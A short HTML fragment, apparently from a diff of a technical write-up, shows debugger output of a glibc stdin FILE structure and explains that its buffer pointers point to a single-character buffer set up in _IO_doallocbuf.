+  <span style="color:#6639ba">_lock</span> = <span style="color:#0550ae">0x7efc76c05720</span> &lt;<span style="color:#953800">_IO_stdfile_0_lock</span>&gt;,
+  <span style="color:#6639ba">_offset</span> = 0xffffffffffffffff,
+  <span style="color:#6639ba">_codecvt</span> = <span style="color:#0550ae">0x0</span>,</code></pre>
 
       <p>The <span class='monospace'>buf_base</span> and <span class='monospace'>buf_end</span> pointers actually point to this single-char sized buffer. This is configured in <span class='monospace'>_IO_doallocbuf</span>.</p>
 
